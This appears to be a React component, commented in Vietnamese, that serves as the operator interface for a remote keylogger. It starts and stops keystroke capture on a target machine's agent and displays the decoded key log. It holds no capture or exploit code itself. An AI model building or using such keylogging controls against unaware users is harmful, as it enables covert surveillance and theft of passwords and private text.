import { useMemo } from 'react';
import { useModalEscape } from '../hooks/useModalEscape';
import type { KeylogTargetOs } from '../utils/formatKeylogDisplay';
import { formatKeylogDisplay } from '../utils/formatKeylogDisplay';

type KeyloggerModalProps = {
    open: boolean;
    targetLabel: string;
    /** Hệ điều hành máy chạy agent — dùng để map vk / keycode (tự nhận từ log nếu có). */
    targetOs: KeylogTargetOs;
    running: boolean;
    content: string;
    busy: boolean;
    onClose: () => void;
    onStart: () => void;
    onStop: () => void;
    onRefresh: () => void;
    onClear: () => void;
};

function KeyloggerModal({
    open,
    targetLabel,
    targetOs,
    running,
    content,
    busy,
    onClose,
    onStart,
    onStop,
    onRefresh,
    onClear,
}: KeyloggerModalProps) {
    useModalEscape(open, onClose);

    const displayText = useMemo(() => formatKeylogDisplay(content, targetOs), [content, targetOs]);

    if (!open) return null;

    return (
        <div className="modal-backdrop" onClick={onClose} role="presentation">
            <div
                className="modal-panel process-modal"
                onClick={(event) => event.stopPropagation()}
                role="dialog"
                aria-modal="true"
                aria-labelledby="keylogger-title"
            >
                <div className="modal-header">
                    <div>
                        <h2 id="keylogger-title">Keylogger</h2>
                        <p className="modal-sub">
                            {targetLabel} · agent {running ? 'đang ghi' : 'đã dừng'}
                        </p>
                    </div>

                    <button className="btn modal-close" onClick={onClose} type="button">
                        Close
                    </button>
                </div>

                <div className="process-modal-toolbar">
                    <button
                        className="btn primary"
                        disabled={busy || running}
                        onClick={onStart}
                        type="button"
                    >
                        Start
                    </button>

                    <button
                        className="btn btn-danger"
                        disabled={busy || !running}
                        onClick={onStop}
                        type="button"
                    >
                        Stop
                    </button>

                    <button className="btn" disabled={busy} onClick={onRefresh} type="button">
                        Refresh
                    </button>

                    <button className="btn" disabled={busy} onClick={onClear} type="button">
                        Clear view
                    </button>
                </div>

                <div className="process-table-wrap">
                    <p className="modal-sub keylogger-log-hint">
                        Hiển thị đã gỡ timestamp; ký tự theo bố cục phím US (không có Shift / IME). Log gốc:
                        Windows vk, macOS keycode.
                    </p>

                    <pre
                        className="modal-body-inline"
                        style={{
                            whiteSpace: 'pre-wrap',
                            wordBreak: 'break-word',
                        }}
                    >
                        {displayText ||
                            '(chưa có dữ liệu — bấm Start trên agent rồi Refresh / đợi tự cập nhật)'}
                    </pre>
                </div>
            </div>
        </div>
    );
}

export default KeyloggerModal;
